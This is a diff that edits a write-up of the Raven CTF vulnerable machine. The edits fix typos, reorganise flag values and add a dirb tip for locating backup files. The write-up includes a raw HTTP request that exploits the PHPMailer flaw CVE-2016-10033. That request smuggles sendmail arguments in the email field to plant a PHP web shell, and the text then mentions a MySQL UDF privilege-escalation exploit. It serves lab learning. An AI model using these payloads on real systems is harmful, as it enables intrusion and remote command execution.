@@ -2,7 +2,7 @@
 ************************************************************************************************************************ 
 **														      **														                                                          **
 ** Before diving into Raven VM, let me remind you that this machine has 4 flags and 2 way to get an root access.      ** 
-** This write-up will discuss the steps that I followed to compromise this vulnerable machine.=                       **
+** This write-up will discuss the steps that I followed to compromise this vulnerable machine.                        **
 ** 										 	  			      **														                                                        ** 
 ************************************************************************************************************************
 ************************************************************************************************************************
@@ -146,8 +146,7 @@ Content-Type: text/html; charset=iso-8859-1
 4. I got stuck at this point after trying to compromise the blog http://raven.local/wordpress/ 
 (Vulnerability assement, password cracking) until I ran acunitix VS against the web application 
 and it gave me a valuable information : Existing of Backup file contact.zip
-Afer downloading the exiting file, this code snippet shows that the web app is actually affected with CVE-2016-10033 : 
-
+Afer downloading the  existing file, this code snippet shows that the web app is actually affected with CVE-2016-10033 : 
 <?php
 				if (isset($_REQUEST['action'])){
 					$name=$_REQUEST['name'];
@@ -173,6 +172,8 @@ Afer downloading the exiting file, this code snippet shows that the web app is a
 				}  
 				?>
 
+Note : you can use dirb to find backup file like this : dirb http://raven.local -X (.zip|.old|...)
+
 Manualy, I injected this payload using burpsuite:
 
 POST /contact.php HTTP/1.1 <-- changed mail.php
@@ -188,17 +189,20 @@ Connection: close
 
 action=submit&name=ss&email="attacker\" -oQ/tmp/ -Xvendor/shell.php  some"@lala.com&message=<?php system($_GET['c']); ?>
 
-Next, I used web_delivery exploit on metasploit to have a low privileged access and this are my findings : 
+Next, I used web_delivery exploit on metasploit to have a low privileged access and these are my findings : 
 
-** The 2nd flag is located on /var/html/www/flag2.txt : flag3{afc01ab56b50591e7dccf93122770cd2}
+** The 2nd flag is located on /var/html/flag2.txt : flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
 ** The 3rd and 4th flag are in the wp_posts table on mysql (U can have the mysql password on /var/www/html/wordpress/wp-config.php) : 
+flag3{afc01ab56b50591e7dccf93122770cd2}
 flag4{715dea6c055b9fe3337544932f2941ce}
 
 ========================================
 ||  	   Privilge escalation        ||
 ========================================
 
-5. Since the exploit scripts provided by LinEnum.sh were not effective, the potential exploit was UDF injection since mysql version is 5.5.60 (https://www.exploit-db.com/exploits/1518/). Note, you need to compile the C code on your box not Raven.
+5. Since the exploit scripts provided by LinEnum.sh were not effective, 
+I found a potential exploit which is Mysql UDF injection. 
+Note tha mysql version is 5.5.60 (https://www.exploit-db.com/exploits/1518/) and you need to compile the C code on your box not Raven.
 
 mysql> use mysql;
 use mysql;
@@ -308,3 +312,5 @@ Hit me up on Twitter and let me know what you thought:
 
 @mccannwj / wjmccann.github.io
 $ 
+
+Written by Bl@ckSH
